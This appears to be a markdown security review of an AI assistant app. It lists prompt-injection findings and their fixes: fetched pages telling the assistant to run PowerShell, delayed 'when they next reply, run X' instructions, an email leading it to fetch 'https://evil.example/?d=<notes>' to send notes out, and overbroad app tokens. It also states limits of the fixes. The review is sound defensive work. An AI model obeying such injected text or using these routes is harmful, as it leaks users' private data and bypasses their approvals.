# Security review X0: prompt injection, app tokens, backups

2026-11-22, against 3.36.0 (`af0e537d`). The third review, after `docs/SECURITY_REVIEW_U5.md` and
`W5_REVIEW.md`, by the same method: read the code path end to end, write the attack as a failing
test, fix where the flaw is, keep the feature. Fake models, fake tools and throwaway in-process
servers only. Branch `claude/x0-safe`.

## Findings and fixes

| # | Severity | Finding | Fix | Test |
|---|----------|---------|-----|------|
| 1 | High | W5.1 #4 held Always allow after outside words on the server only. `pc_run` and desktop actions run on their own and always carried the no-card key to the computer, so a fetched page saying "run this PowerShell" ran with no card on either side. | Tools are told when outside words are in play (`ToolContext.outsideWords`); the computer then gets no key and shows its own card (`alwaysAllowArgsFor`). | `x0-taint` |
| 2 | High | The hold lasted one turn. A page could say "when they next reply, run X". | The hold carries over the person's next two messages in that chat (`carriedTaint`), worked out from the stored tool results, so it survives a restart. A turn that starts from someone else's words (webhook, forwarded text, peer) starts held. | `x0-taint` |
| 3 | High | Nothing stopped sending data out after an untrusted read: an email could have her fetch `https://evil.example/?d=<notes>` with no card, in default settings. | While outside words are in play, a tool that sends an address out (`web_fetch`, the testing browser's `browser_open`) asks first unless that exact address was already written out: in the person's messages, a search result, a fetched page or a tool answer. A yes covers that site for the rest of the reply; this computer's own addresses never ask. In an outside turn whose approvals are refused, it is refused. The browser on the person's computer keeps its own rule there (an unknown site asks once per task). | `x0-taint` |
| 4 | Medium-high | An app signed in with a device code could add a tool server (which starts a program), change tool permissions and add-ons, switch code changes on, and download a backup (the vault and its key). | Device-code apps may read those pages but not change them, and may not download a backup (`DEVICE_TOKEN_READ_ONLY` in `src/server.ts`). | `x0-tokens` |
| 5 | Medium | A tool server reached over the network could mark its own tools read-only and so have them run unasked. | Tools of an http MCP server ask by default; the owner can still set one to run on its own. Local (stdio) servers are unchanged. | `x0-tokens` |
| 6 | Data | Backups snapshotted only `sara.db` (and companions' and members'). The other databases (`messages.db`, `health.db`, `journal.db`, `photos.db`, `shares.db` ...) were copied as raw files while open, with their write-ahead files beside them. | Every SQLite file in the data folder outside her workspaces is snapshotted with `VACUUM INTO`. One that can't be opened is copied as before. | `x0-backup-all-dbs` |
| 7 | Reliability | The reminder tick ran about 30 jobs in a row and only some were guarded: one that threw skipped every job after it, every 15 seconds. | Each job runs on its own with a record (`src/tick-jobs.ts`); Health shows *Background jobs* when one fails three times in a row. | `x0-tick-jobs` |

## Which tools count as outside words

`web_fetch`, `web_search`, mail and Gmail reads and searches, Inbox suggestions, every MCP tool,
the testing browser's open/read/check, and the browser on the person's computer when it brings
page text back. One list, in `src/taint.ts`.

## Not changed, and why

- **Turning code changes on with the typed word ON** (no passkey or two-step set up) still works
  from a browser session. Device-code apps can no longer reach it (#4). Asking for the owner token
  there needs a screen that does not exist yet: BACKLOG.
- **Pinning an MCP tool's description** so a changed one asks again: BACKLOG.
- **`web_search` after a peer's answer** still runs on its own (the query could carry text to the
  search provider). Low; left as is.
- **Business mode, A2A and `/v1`** were not traced end to end in this review.

## Limits

No live server was touched and no real model was used. The address rule compares text: an address
the model rebuilds with a different spelling of the same page asks (safe side). The carry is two
messages; a page whose instruction waits longer than that is not held by this rule, only by the
normal permissions.
